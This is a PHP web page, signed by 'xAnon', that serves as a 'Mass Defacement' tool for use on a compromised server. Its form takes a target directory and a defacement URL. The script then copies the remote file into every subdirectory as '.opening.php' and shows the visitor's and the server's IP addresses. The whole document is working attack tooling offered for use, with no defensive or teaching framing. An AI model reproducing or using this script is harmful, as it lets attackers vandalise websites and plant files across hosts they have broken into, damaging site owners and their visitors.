<link rel="SHORTCUT ICON" href="http://imageshack.us/a/img716/272/philippineflagsourcec0d.gif" type="image">
<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Orbitron' rel='stylesheet' type='text/css'>
<style type="text/css">body, a:hover {cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1054.cur), url(http://cur.cursors-4u.net/cursors/cur-9/cur862.png), progress !important;}</style>
<title>Mass </title>
<center><img src="http://oi44.tinypic.com/k2my3b.jpg height=" width="320"></center>
<center><font color="white" face="Orbitron"><b>Mass Defacement</td></b></center>
<?php

echo "<center><textarea rows='100' cols='100'>";
$defaceurl = $_POST['massdefaceurl'];
$dir = $_POST['massdefacedir'];
echo $dir."\n";
 
if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
                        if(filetype($dir.$file)=="dir"){
                                $newfile=$dir.$file."/.opening.php";
                                echo $newfile."\n";
                                if (!copy($defaceurl, $newfile)) {
                                        echo "failed to copy $file...\n";
                                }
                        }
        }
        closedir($dh);
    }
}
echo "</textarea></center>";
?>
<font color="white">
<body bgcolor="#000000">
<font face="Iceland">
<br>
<form action='<?php basename($_SERVER['PHP_SELF']); ?>' method='post'>
[+] Main Directory: <input type='text' style='width: 250px' value='<?php  echo getcwd() . "/"; ?>' name='massdefacedir'>
<br><br>
[+] Defacement Url: <input type='text' style='width: 250px' name='massdefaceurl'>
<br>
<br>
<input type='submit' name='execmassdeface' value='Execute'></form></td>
 
 

<br><br><br>
<font size="5">
** Main Directory = The Directory you want to mass deface (Must have read/write permission) **<br>
<font face="Iceland"><b>Edit by ~xAnon</b>
</body></html>

<center>
<?php
// get an IP address
$ip = $_SERVER['REMOTE_ADDR'];
// display it back
echo "Your IP : " . $ip;
?>
<font> | </font>
<?php
// get an IP address
$server = $_SERVER['SERVER_ADDR'];
echo "Server IP : " . $server;
?>
<br><br>

</font size="5">
</center>
